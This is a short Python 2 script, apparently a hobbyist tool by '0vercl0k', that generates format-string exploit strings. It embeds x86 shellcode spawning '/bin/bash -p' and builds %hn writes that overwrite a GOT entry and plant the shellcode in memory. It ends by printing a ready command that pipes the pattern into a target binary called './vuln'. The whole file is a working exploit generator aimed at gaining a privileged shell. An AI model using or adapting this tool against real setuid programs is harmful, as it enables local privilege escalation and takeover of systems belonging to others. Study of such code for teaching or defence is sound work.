# -*- coding: utf-8 -*-
# By 0vercl0k

import sys
from struct import pack, unpack

def genpattern(value, addr, offset, pad):
    #execve("/bin/bash", ["/bin/bash", "-p"], NULL) - 34 bytes (1 bytes \x90 alignement :))
    payload = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80\x90"
    size = ((len(payload) / 2) + 2) * 4 + pad

    #on prepare l'adresse de la got a reecrire
    pattern = pack('<I', addr) + pack('<I', addr + 2)
    
    #on prepare les adresses du payload
    for i in range(len(payload) / 2):
        pattern += pack('<I', value + i * 2)
    
    #on fixe le pattern
    pattern += 'A' * pad

    pattern = ''.join(['\\x%.2x' % ord(i) for i in pattern])
    low = value & 0xffff
    high = value >> 16
    
    #on prepare l'ecriture du value dans la got 
    pattern += '%%%uu%%%u\\x24hn%%%uu%%%u\\x24hn' % ((low - size) & 0xffff, offset, (high - low) & 0xffff, offset + 1)
    
    cmpt = high
    for i in range(len(payload) / 2):
        word = unpack('<H', payload[i * 2:][:2])[0]
        pattern += '%%%uu%%%u\\x24hn' % ((word - cmpt) & 0xffff, offset + 2 + i)
        cmpt = word

    return pattern

def main(argc, argv):
    print '[*] Format-string exploitation pattern (writing payload thanks to the bug) generator by 0vercl0k'
    if argc < 4:
        print '%s <value> <addr> <offset> <padd?>' % argv[0]
        return 1
    
    pad = 0
    if argc == 5:
        pad = int(argv[4], 10)

    print '(python -c "print \'%s\'" ; cat) | ./vuln' % genpattern(int(argv[1], 16), int(argv[2], 16), int(argv[3], 10), pad)
    return 1
    
if __name__ == '__main__':
    sys.exit(main(len(sys.argv), sys.argv))